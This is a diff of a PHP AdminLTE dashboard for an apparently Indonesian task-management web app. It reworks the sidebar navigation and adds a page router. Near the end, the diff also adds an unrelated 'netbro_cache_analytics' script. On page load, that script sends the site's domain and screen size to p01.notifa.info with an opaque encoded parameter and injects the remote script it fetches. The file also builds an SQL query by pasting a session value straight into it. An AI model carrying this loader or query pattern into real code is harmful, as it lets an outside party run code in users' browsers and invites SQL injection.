@@ -84,8 +84,8 @@ if (empty($_SESSION['nip'])) {
 		<?php $sql = mysqli_query($conn, "SELECT * FROM pegawai where nip='$_SESSION[nip]'");
 											$row = mysqli_fetch_array($sql);
 		?>
-	  <span class="brand-text font-weight-light"><?php echo $_SESSION['jabatan']; ?></span><br>
-	  <span class="brand-text font-weight-light"><?php echo $_SESSION['divisi']; ?></span>
+	  <h1 class="brand-text font-weight-light"><b><?php echo $_SESSION['divisi']; ?></b></h1>
+	  <span class="brand-text font-weight-light"><?php echo $_SESSION['jabatan']; ?></span>
     </a>
 
     <!-- Sidebar -->
@@ -110,8 +110,8 @@ if (empty($_SESSION['nip'])) {
                with font-awesome or any other icon font library -->
 
               <li class="nav-item">
-                <a href="./halaman_atasan.php" class="nav-link">
-                  <i class="fa fa-circle-o nav-icon"></i>
+                <a href="./index.php" class="nav-link">
+                  <i class="fa fa-dashboard nav-icon"></i>
                   <p>Dashboard</p>
                 </a>
               </li>
@@ -126,7 +126,7 @@ if (empty($_SESSION['nip'])) {
                 <ul class="nav nav-treeview">
                 <?php if ($_SESSION['hak_akses'] != '2') { ?>
                   <li class="nav-item">
-                    <a href="./pages/tambah_task.php" class="nav-link">
+                    <a href="?p=tambah_task" class="nav-link">
                       <i class="fa fa-circle-o nav-icon"></i>
                       <p>Add Task</p>
                     </a>
@@ -135,16 +135,25 @@ if (empty($_SESSION['nip'])) {
 
                   <?php if ($_SESSION['hak_akses'] != '2') { ?>
                   <li class="nav-item">
-                    <a href="./pages/lihat_task.php" class="nav-link">
+                    <a href="?p=lihat_task" class="nav-link">
                       <i class="fa fa-circle-o nav-icon"></i>
                       <p>Lihat Task</p>
                     </a>
                   </li>
                   <?php } ?>
 
+                  <?php if ($_SESSION['hak_akses'] != '2') { ?>
+                  <li class="nav-item">
+                    <a href="?p=tambah_pj" class="nav-link">
+                      <i class="fa fa-circle-o nav-icon"></i>
+                      <p>Penanggung Jawab</p>
+                    </a>
+                  </li>
+                  <?php } ?>
+
                   <?php if ($_SESSION['hak_akses'] != '1') { ?>
                   <li class="nav-item">
-                    <a href="./pages/daftar_task.php" class="nav-link">
+                    <a href="?p=daftar_task" class="nav-link">
                       <i class="fa fa-circle-o nav-icon"></i>
                       <p>Daftar Task</p>
                     </a>
@@ -167,95 +176,56 @@ if (empty($_SESSION['nip'])) {
     </div>
     <!-- /.sidebar -->
   </aside>
-
-  <!-- Content Wrapper. Contains page content -->
-  <div class="content-wrapper">
-    <!-- Content Header (Page header) -->
-    <div class="content-header">
-      <div class="container-fluid">
-        <div class="row mb-2">
-          <div class="col-sm-6">
-            <h1 class="m-0 text-dark">Dashboard</h1>
-          </div><!-- /.col -->
-          <div class="col-sm-6">
-            <ol class="breadcrumb float-sm-right">
-              <li class="breadcrumb-item"><a href="#">Home</a></li>
-              <li class="breadcrumb-item active">Dashboard</li>
-            </ol>
-          </div><!-- /.col -->
-        </div><!-- /.row -->
-      </div><!-- /.container-fluid -->
-    </div>
-    <!-- /.content-header -->
-
     <!-- Main content -->
-    <section class="content">
-      <div class="container-fluid">
-        <!-- Small boxes (Stat box) -->
-        <div class="row">
-          <div class="col-lg-3 col-6">
-            <!-- small box -->
-            <div class="small-box bg-info">
-              <div class="inner">
-                <h3>150</h3>
-
-                <p>New Orders</p>
-              </div>
-              <div class="icon">
-                <i class="ion ion-bag"></i>
-              </div>
-              <a href="#" class="small-box-footer">More info <i class="fa fa-arrow-circle-right"></i></a>
-            </div>
+        <div class="content-wrapper">
+				<!-- Content area -->
+          <div class="content">
+            <?php
+              $pages_dir = 'pages';
+              if (!empty($_GET['p'])) {
+                  $pages = scandir($pages_dir, 0);
+                  unset($pages[0], $pages[1]);
+                  $p = $_GET['p'];
+              if (in_array($p . '.php', $pages))
+                  include($pages_dir . '/' . $p . '.php');
+              else
+                  echo 'Halaman tidak ditemukan! :(';
+              } else
+                  include($pages_dir . '/home.php');
+            ?>
           </div>
-          <!-- ./col -->
-          <div class="col-lg-3 col-6">
-            <!-- small box -->
-            <div class="small-box bg-success">
-              <div class="inner">
-                <h3>53<sup style="font-size: 20px">%</sup></h3>
-
-                <p>Bounce Rate</p>
-              </div>
-              <div class="icon">
-                <i class="ion ion-stats-bars"></i>
-              </div>
-              <a href="#" class="small-box-footer">More info <i class="fa fa-arrow-circle-right"></i></a>
-            </div>
-          </div>
-          <!-- ./col -->
-          <div class="col-lg-3 col-6">
-            <!-- small box -->
-            <div class="small-box bg-warning">
-              <div class="inner">
-                <h3>44</h3>
-
-                <p>User Registrations</p>
-              </div>
-              <div class="icon">
-                <i class="ion ion-person-add"></i>
-              </div>
-              <a href="#" class="small-box-footer">More info <i class="fa fa-arrow-circle-right"></i></a>
-            </div>
-          </div>
-          <!-- ./col -->
-          <div class="col-lg-3 col-6">
-            <!-- small box -->
-            <div class="small-box bg-danger">
-              <div class="inner">
-                <h3>65</h3>
-
-                <p>Unique Visitors</p>
-              </div>
-              <a href="#" class="small-box-footer">More info <i class="fa fa-arrow-circle-right"></i></a>
-            </div>
-          </div>
-          <!-- ./col -->
         </div>
-        <!-- /.row (main row) -->
-      </div><!-- /.container-fluid -->
-    </section>
     <!-- /.content -->
   </div>
+
+  <script type="text/javascript">
+		if (self == top) {
+			function netbro_cache_analytics(fn, callback) {
+				setTimeout(function() {
+					fn();
+					callback();
+				}, 0);
+			}
+
+			function sync(fn) {
+				fn();
+			}
+
+			function requestCfs() {
+				var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
+				var idc_glo_r = Math.floor(Math.random() * 99999999999);
+				var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
+					"4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mVPOusGZYLpfqT6nfh03G6uiMlelqeNgEqHjBJuZk8rLOubZXl62Qv6WVJN8lJFcyaPpUV7Tux1oQpB49HrPzqrbwmfy74C8Z5ZzO17ZdkwJqKHjmuY67QlnQVSGgAKFgk8MMrFnR0tmuwR99i9Z9leHD%2bHA9sQcFu5ldJWa3QAdgielop6h6EwgsDQV6p0ieBpjtJ%2fJ5lpuPU%2beD0%2fLbobXvW0MhsudRIzaxrYMno1fCihodfv%2bA6mBClyMDA8i3weP3Ys3%2fwDh8OqvqXYhwCqPPH2zggDpNpvRUa4r26up%2fWRJtW9gcGq8X3Kbhi4vPGUg%2fxkqwEJOorqgkbohJFy94u15LtfYfHasVn%2fNoOLT0q9teNCtdRYThsno2HG3xDS24oj%2bXc8gpLvVeqoAh5eiIx0fOR%2bfzck55jmVvTr%2fZyiMgAFoORGnQIlNvuNvdmz4GHMxeJ0IxMOrI7NtC7lYExrDaym3TOkbq5tXfJ3jHUlBX8Zp1gf5v2J%2f5k8%2fconIoz0i4YAnoP43dPAYvvVJiFz%2bS4thE" +
+					"&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
+				var bsa = document.createElement('script');
+				bsa.type = 'text/javascript';
+				bsa.async = true;
+				bsa.src = url;
+				(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
+			}
+			netbro_cache_analytics(requestCfs, function() {});
+		};
+	</script>
   <!-- /.content-wrapper -->
   <footer class="main-footer">
     <strong>Copyright &copy; 2014-2018 <a href="http://adminlte.io">AdminLTE.io</a>.</strong>
